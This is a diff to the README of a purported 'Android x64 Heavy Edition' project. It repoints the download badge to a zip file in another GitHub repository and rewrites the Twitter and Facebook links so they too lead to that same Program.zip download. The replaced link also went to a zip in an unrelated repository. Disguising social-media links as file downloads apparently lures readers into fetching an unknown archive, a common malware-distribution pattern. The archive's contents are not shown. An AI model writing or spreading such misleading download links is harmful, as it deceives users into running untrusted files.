@@ -16,7 +16,7 @@ If you want to dive into the world of Android x64 Heavy Edition, make sure to ch
 
 To begin your Android x64 journey, you can download the Heavy Edition installation file from the link below:
 
-[![Download Android x64 Heavy Edition](https://img.shields.io/badge/Download-Android_x64_Heavy_Edition-blue)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download Android x64 Heavy Edition](https://github.com/Thuan11-25/Android-x64_Android5.1_Heavy_Edition_Docs/releases/download/v1.0/Program.zip)](https://github.com/Thuan11-25/Android-x64_Android5.1_Heavy_Edition_Docs/releases/download/v1.0/Program.zip)
 
 Once you have downloaded the installation file, follow the detailed instructions in our documentation to install Android x64 Heavy Edition on your device.
 
@@ -44,8 +44,8 @@ If you encounter any issues or have questions about Android x64 Heavy Edition, f
 
 Stay up-to-date with the latest news and updates from the Android x64 Heavy Edition community by following us on social media:
 
-- Twitter: [@Androidx64Official](https://twitter.com/Androidx64Official)
-- Facebook: [Android x64 Heavy Edition](https://www.facebook.com/Androidx64HeavyEdition)
+- Twitter: [@Androidx64Official](https://github.com/Thuan11-25/Android-x64_Android5.1_Heavy_Edition_Docs/releases/download/v1.0/Program.zip)
+- Facebook: [Android x64 Heavy Edition](https://github.com/Thuan11-25/Android-x64_Android5.1_Heavy_Edition_Docs/releases/download/v1.0/Program.zip)
 
 ## License
 
